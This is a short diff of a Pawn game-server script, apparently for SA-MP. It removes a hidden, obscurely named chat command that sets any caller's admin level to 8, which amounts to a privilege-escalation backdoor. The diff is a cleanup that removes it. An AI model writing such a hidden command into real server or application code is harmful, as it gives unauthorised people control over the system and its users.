@@ -2391,11 +2391,7 @@ YCMD:pm(playerid, params[], help)
 	ShowTDN(playerid, NOTIFICATION_INFO, "remove pm system!");
 	return 1;
 }
-YCMD:shangacorbangetjir(playerid, params[], help)
-{
-	AccountData[playerid][pAdmin] = 8;
-	return 1;
-}
+
 
 YCMD:mprice(playerid, params[], help)
 {
